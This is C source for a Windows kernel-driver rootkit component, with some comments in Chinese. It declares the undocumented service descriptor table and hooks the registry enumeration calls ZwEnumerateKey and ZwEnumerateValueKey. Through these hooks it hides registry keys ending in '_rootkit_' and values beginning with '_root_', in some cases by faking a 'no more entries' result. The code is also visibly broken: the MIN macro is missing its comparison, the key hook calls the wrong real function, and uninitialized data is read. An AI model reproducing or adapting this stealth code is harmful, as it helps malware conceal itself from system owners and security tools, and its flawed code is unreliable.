#include "ntddk.h"   
#include "stdio.h"   
#include "stdlib.h"   
#include <ctype.h>   
   
#define MIN(x,y) ((x)  (y) ? (x) : (y))   
#define MAXPATHLEN 1024   
   
#pragma pack(push, 1)   
//未公开的数据结构   
typedef struct {   
    /*  
     * Table containing cServices elements of pointers to service handler  
     * functions, indexed by service ID.  
     */   
    PVOID       *rgpfnHandlerTable;   
    /*  
     * Table that counts how many times each service is used. This table  
     * is only updated in checked builds.  
     */   
    PULONG      rgulCounterTable;   
    /*  
     * Number of services contained in this table.  
     */   
    ULONG       cServices;   
    /*  
     * Table containing the number of bytes of parameters the handler  
     * function takes.  
     */   
    PUCHAR      rguchParamTable;   
} SSD, *PSSD;   
#pragma pack(pop)   
   
NTKERNELAPI NTSTATUS ObQueryNameString (   
    IN PVOID                        Object,   
    IN OUT PUNICODE_STRING      Name,   
    /* ^ this should strictly be PBOJECT_NAME_INFORMATION */   
    IN ULONG                        MaximumLength,   
    OUT PULONG                      ActualLength   
);   
   
//由句柄获得全名   
BOOLEAN PathFromHandle (HANDLE hKey, PUNICODE_STRING lpszSubKeyVal,    
            PCHAR fullname)   
{   
    PVOID           pKey = NULL;   
    ANSI_STRING     keyname;   
    PCHAR           tmpname;   
    PUNICODE_STRING     fullUniName;   
    ULONG           actualLen;   
   
    /* Allocate a temporary buffer */   
    tmpname = ExAllocatePool (PagedPool, MAXPATHLEN);   
    if (tmpname == NULL)   
        /* Not enough memory */   
        return FALSE;   
   
    *fullname = *tmpname = '\0';  
   
    if (NT_SUCCESS (ObReferenceObjectByHandle (hKey, 0, NULL, KernelMode,    
        &pKey, NULL)) && pKey != NULL) {   
   
        fullUniName = ExAllocatePool (PagedPool, MAXPATHLEN * 2 +    
            2 * sizeof(ULONG));   
        if (fullUniName == NULL) {   
               
            ObDereferenceObject (pKey);   
            ExFreePool (tmpname);   
            return FALSE;   
        }   
   
        fullUniName->MaximumLength = MAXPATHLEN*2;   
        if (NT_SUCCESS (ObQueryNameString (pKey, fullUniName,    
            MAXPATHLEN, &actualLen ))) {   
            if (NT_SUCCESS (RtlUnicodeStringToAnsiString (   
                &keyname, fullUniName, TRUE))) {    
                if(*keyname.Buffer != '\0') {   
                    if (*keyname.Buffer != '\\')   
                        strcpy (tmpname, "\\");   
                    else   
                        strcpy (tmpname, "");   
                    strncat (tmpname, keyname.Buffer,    
                        MIN( keyname.Length,    
                        MAXPATHLEN - 2 ));   
                }   
                RtlFreeAnsiString (&keyname);   
            }   
        }   
   
        ObDereferenceObject (pKey);   
        ExFreePool (fullUniName);   
    }   
       
    if (lpszSubKeyVal != NULL) {   
        keyname.Buffer = NULL;   
        if (NT_SUCCESS (RtlUnicodeStringToAnsiString (&keyname,    
            lpszSubKeyVal, TRUE))) {   
            if (*keyname.Buffer != '\0') {   
                strcat (tmpname, "\\");   
                strncat (tmpname, keyname.Buffer,   
                    MIN(keyname.Length, MAXPATHLEN - 1 -   
                    strlen(tmpname)));   
            }   
            RtlFreeAnsiString (&keyname);   
        }   
    }   
   
    strcpy (fullname, tmpname);   
    ExFreePool (tmpname);   
   
    return TRUE;   
}   
   
int CheckKeyByName(PCHAR szKeyName)   
{   
    PCHAR temp=szKeyName+(strlen(szKeyName)-9);   
    if(!strncmp(temp,"_rootkit_",9))   
        return 1;   
     else   
         return 0;     
}   
    
VOID AdjustKeyName (PCHAR szKeyName)   
{   
    PCHAR p;   
   
    if (_strnicmp (szKeyName, "\\\\", 2) == 0)
	{   
        memmove (szKeyName, szKeyName + 1, strlen (szKeyName));   
    }   
   
#define HKUS1 "\\REGISTRY\\USER\\S"   
#define HKUS2 "HKEY_CURRENT_USER\\"   
    if (_strnicmp (szKeyName, HKUS1, sizeof(HKUS1) - 1) == 0)
	{   
        p = strchr (szKeyName + sizeof(HKUS1) + 1, '\\');   
        if (p == NULL)   
            return;   
        p++;   
        memmove (szKeyName + sizeof(HKUS2) - 1, p, strlen (p) + 1);   
        memcpy (szKeyName, HKUS2, sizeof(HKUS2) - 1);   
#define HKU1 "\\REGISTRY\\USER\\"   
#define HKU2 "HKEY_USERS\\"   
    }
	else if
	
		(_strnicmp (szKeyName, HKU1, sizeof(HKU1) - 1) == 0) {   
        p = szKeyName + sizeof(HKU1);   
        memmove (szKeyName + sizeof(HKU2) - 1, p, strlen (p) + 1);   
        memcpy (szKeyName, HKU2, sizeof(HKU2) - 1);   
#define HKM1 "\\REGISTRY\\MACHINE\\"   
#define HKM2 "HKEY_LOCAL_MACHINE\\"   
    }
	else if
	(
		_strnicmp (szKeyName, HKM1, sizeof(HKM1) - 1) == 0) {   
        p = szKeyName + sizeof(HKM1) - 1;   
        memmove (szKeyName + sizeof(HKM2) - 1, p, strlen (p) + 1);   
        memcpy (szKeyName, HKM2, sizeof(HKM2) - 1);   
    }   
}   

NTSTATUS Hook_ZwEnumerateKey (   
    IN HANDLE KeyHandle,   
    IN ULONG Index,   
    IN KEY_INFORMATION_CLASS KeyInformationClass,   
    OUT PVOID KeyInformation,   
    IN ULONG Length,   
    OUT PULONG ResultLength   
)   
{   
    NTSTATUS rc;   
    PCHAR szFullName;   
    PWCHAR pName = NULL;   
    PULONG pulNameLen = NULL;   
    //DbgPrint("zwenumeratekey called\n");   
    /* Find the full name of the key and check access on it */   
    szFullName = ExAllocatePool (PagedPool, MAXPATHLEN);   
    if (szFullName != NULL) {   
        if (!PathFromHandle (KeyHandle, NULL, szFullName)) {   
            ExFreePool (szFullName);   
            szFullName = NULL;   
        }   
    }   
   
    rc = Real_ZwEnumerateKey (KeyHandle, Index, KeyInformationClass,   
        KeyInformation, Length, ResultLength);   
   
    if (NT_SUCCESS (rc) && szFullName != NULL) {   
        switch (KeyInformationClass) {   
        case KeyBasicInformation:   
            pName = ((PKEY_BASIC_INFORMATION)KeyInformation)->Name;   
            pulNameLen = &((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;   
            break;   
        case KeyNodeInformation:   
            pName = ((PKEY_NODE_INFORMATION)KeyInformation)->Name;   
            pulNameLen = &((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;   
            break;   
        case KeyNameInformation:   
            pName = ((PKEY_NAME_INFORMATION)KeyInformation)->Name;   
            pulNameLen = &((PKEY_NAME_INFORMATION)KeyInformation)->NameLength;   
            break;   
        case KeyFullInformation:   
            break;   
        default:   
            KdPrint(("Hook_ZwEnumerateKey(): unknown class %d",KeyInformationClass));   
        }   
   
        if (pName != NULL)
		{   
            UNICODE_STRING us;   
            ANSI_STRING as;   
   
            strcat (szFullName, "\\");   
   
            us.Length = us.MaximumLength = (USHORT)*pulNameLen;   
            us.Buffer = pName;   
            as.Length = 0;   
            as.MaximumLength = MAXPATHLEN - 1 - strlen (szFullName);   
            as.Buffer = szFullName + strlen (szFullName);   
            rc = RtlUnicodeStringToAnsiString (&as, &us, FALSE);   
            if (NT_SUCCESS (rc))
			{   
                as.Buffer[as.Length] = '\0';   
                AdjustKeyName (szFullName);   
                //DbgPrint(szFullName);   
                if (CheckKeyByName (szFullName) )    
                {   
                    //wcscpy (pName, L"temp");   
                    //*pulNameLen = 0;   
                     Index++;   
                    // pName=NULL;   
                     return Real_ZwEnumerateValueKey(KeyHandle, Index, KeyInformationClass,KeyInformation, Length, ResultLength);   
                }   
            }   
        }   
    }   
   
    if (szFullName != NULL)   
        ExFreePool (szFullName);   
   
    return rc;   
}   
 
NTSTATUS Hook_ZwEnumerateValueKey (   
    IN HANDLE  KeyHandle,   
    IN ULONG  Index,   
    IN KEY_VALUE_INFORMATION_CLASS  KeyValueInformationClass,   
    OUT PVOID  KeyValueInformation,   
    IN ULONG  Length,   
    OUT PULONG  ResultLength   
)   
{   
NTSTATUS ntStatus;    
PVOID NewKeyValueInformation; // pointer   
PVOID KeyValueInfor;   
KEY_VALUE_BASIC_INFORMATION BasicInfo; // bogus structure   
KEY_VALUE_FULL_INFORMATION FullInfo; // bogus structure   
KEY_VALUE_PARTIAL_INFORMATION PartInfo; // bogus structure   
char name[100];   
char *ptr;   
int i;   
   
if (KeyValueInformationClass == KeyValueBasicInformation)   
NewKeyValueInformation = &BasicInfo;   
if (KeyValueInformationClass == KeyValueFullInformation)   
NewKeyValueInformation = &FullInfo;   
if (KeyValueInformationClass == KeyValuePartialInformation )   
NewKeyValueInformation = &PartInfo;   
   
   
ntStatus = ((T_ZwEnumerateValueKey)(Real_ZwEnumerateValueKey)) (   
KeyHandle,   
Index,   
KeyValueInformationClass,   
KeyValueInformation,   
Length,   
ResultLength);    
   
if (NT_SUCCESS(ntStatus))   
{       
DbgPrint("enumerate value key!!\n");    
if (KeyValueInformationClass == KeyValueBasicInformation)   
{   
KeyValueInfor=KeyValueInformation;   
DbgPrint("basic!!\n");   
//ptr=(char*)BasicInfo.Name;   
//ptr=(char*)L"_root_";   
   
DbgPrint("namelength: %d",((KEY_VALUE_BASIC_INFORMATION*)KeyValueInfor)->NameLength);   
ptr=(char*)((KEY_VALUE_BASIC_INFORMATION*)KeyValueInfor)->Name;   
sprintf(name,"%S",((KEY_VALUE_BASIC_INFORMATION*)KeyValueInfor)->Name);   
DbgPrint(name);   
/*for(i=0;i<(int)((KEY_VALUE_BASIC_INFORMATION*)KeyValueInfor)->NameLength;i++)  
{  
DbgPrint("0x%02x",*ptr);  
ptr++;  
}  
*/   
if (0 == memcmp(((KEY_VALUE_BASIC_INFORMATION*)KeyValueInfor)->Name,L"_root_",12))   
{   
DbgPrint("Got Value from reg!\n");   
return STATUS_NO_MORE_ENTRIES; // fake the result   
}   
}   
if (KeyValueInformationClass == KeyValueFullInformation)   
{   
DbgPrint("FullInformation Enumerated!!!!!");   
KeyValueInfor=KeyValueInformation;   
   
if (0 == memcmp(((KEY_VALUE_FULL_INFORMATION*)KeyValueInfor)->Name,L"_root_",12))   
{   
DbgPrint("Got Value from reg!\n");   
return STATUS_NO_MORE_ENTRIES; // fake the result   
}   
}   
if (KeyValueInformationClass == KeyValuePartialInformation)   
{   
   
if (0 == memcmp(PartInfo.Data,"_root_",6))   
{   
DbgPrint("Got Value from reg!\n");   
return STATUS_NO_MORE_ENTRIES; // fake the result   
}   
}   
   
// ok, we didn't find a RootkitPrefixed entry so we redo the shit with the original pointer   
ntStatus = ((T_ZwEnumerateValueKey)(Real_ZwEnumerateValueKey)) (   
KeyHandle,   
Index,   
KeyValueInformationClass,   
KeyValueInformation,   
Length,   
ResultLength);    
   
   
}   
   
return ntStatus;   
}   
